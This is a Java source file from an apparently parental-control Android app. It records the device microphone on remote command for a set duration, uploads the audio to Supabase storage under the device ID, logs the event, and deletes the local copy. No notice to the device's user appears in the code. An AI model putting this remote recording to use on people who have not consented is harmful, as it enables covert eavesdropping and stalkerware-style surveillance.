package com.parentalcontrol.monitor;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class RemoteAudioController {
    
    private static final String TAG = "RemoteAudioController";
    
    public interface AudioCallback {
        void onAudioRecorded(String audioUrl);
        void onAudioError(String error);
    }
    
    private Context context;
    private SupabaseClient supabaseClient;
    private String deviceId;
    private MediaRecorder mediaRecorder;
    private Handler handler;
    private boolean isRecording = false;
    private String currentRecordingFile;
    
    public RemoteAudioController(Context context) {
        this.context = context;
        this.supabaseClient = new SupabaseClient(context);
        this.deviceId = DeviceUtils.getDeviceId(context);
        this.handler = new Handler(Looper.getMainLooper());
    }
    
    public void startAudioMonitoring(int duration, AudioCallback callback) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
            != PackageManager.PERMISSION_GRANTED) {
            callback.onAudioError("Audio recording permission not granted");
            return;
        }
        
        if (isRecording) {
            callback.onAudioError("Audio recording already in progress");
            return;
        }
        
        try {
            // Create temporary file for recording
            File audioFile = new File(context.getCacheDir(), "audio_" + System.currentTimeMillis() + ".3gp");
            currentRecordingFile = audioFile.getAbsolutePath();
            
            // Initialize MediaRecorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentRecordingFile);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            Log.i(TAG, "Audio recording started for " + duration + " seconds");
            
            // Stop recording after specified duration
            handler.postDelayed(() -> {
                stopAudioMonitoring();
                uploadAudioFile(callback);
            }, duration * 1000);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting audio recording", e);
            callback.onAudioError("Failed to start audio recording: " + e.getMessage());
            cleanup();
        }
    }
    
    public void stopAudioMonitoring() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                
                Log.i(TAG, "Audio recording stopped");
                
            } catch (Exception e) {
                Log.e(TAG, "Error stopping audio recording", e);
            }
        }
    }
    
    private void uploadAudioFile(AudioCallback callback) {
        if (currentRecordingFile == null) {
            callback.onAudioError("No audio file to upload");
            return;
        }
        
        try {
            File audioFile = new File(currentRecordingFile);
            if (!audioFile.exists()) {
                callback.onAudioError("Audio file not found");
                return;
            }
            
            // Read file into byte array
            FileInputStream fis = new FileInputStream(audioFile);
            byte[] audioBytes = new byte[(int) audioFile.length()];
            fis.read(audioBytes);
            fis.close();
            
            // Generate unique filename
            String filename = "audio_" + deviceId + "_" + System.currentTimeMillis() + ".3gp";
            
            // Upload to Supabase storage
            supabaseClient.uploadAudio(filename, audioBytes, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    try {
                        // Log audio monitoring event
                        org.json.JSONObject audioData = new org.json.JSONObject();
                        audioData.put("event", "remote_audio_recorded");
                        audioData.put("audio_url", response);
                        audioData.put("duration", getDurationFromFile(audioFile));
                        audioData.put("timestamp", System.currentTimeMillis());
                        
                        supabaseClient.logActivity(deviceId, "mic", audioData, new SupabaseClient.ApiCallback() {
                            @Override
                            public void onSuccess(String logResponse) {
                                callback.onAudioRecorded(response);
                                cleanup();
                            }
                            
                            @Override
                            public void onError(String error) {
                                callback.onAudioRecorded(response); // Still return audio URL even if logging fails
                                cleanup();
                            }
                        });
                        
                    } catch (Exception e) {
                        callback.onAudioError("Failed to log audio event: " + e.getMessage());
                        cleanup();
                    }
                }
                
                @Override
                public void onError(String error) {
                    callback.onAudioError("Failed to upload audio: " + error);
                    cleanup();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading audio file", e);
            callback.onAudioError("Failed to upload audio file: " + e.getMessage());
            cleanup();
        }
    }
    
    private int getDurationFromFile(File audioFile) {
        try {
            android.media.MediaMetadataRetriever retriever = new android.media.MediaMetadataRetriever();
            retriever.setDataSource(audioFile.getAbsolutePath());
            String duration = retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION);
            retriever.release();
            
            return duration != null ? Integer.parseInt(duration) / 1000 : 0; // Convert to seconds
        } catch (Exception e) {
            Log.e(TAG, "Error getting audio duration", e);
            return 0;
        }
    }
    
    private void cleanup() {
        // Delete temporary audio file
        if (currentRecordingFile != null) {
            try {
                File audioFile = new File(currentRecordingFile);
                if (audioFile.exists()) {
                    audioFile.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error deleting temporary audio file", e);
            }
            currentRecordingFile = null;
        }
    }
    
    public void shutdown() {
        stopAudioMonitoring();
        cleanup();
        
        if (supabaseClient != null) {
            supabaseClient.shutdown();
        }
    }
    
    public boolean isRecording() {
        return isRecording;
    }
}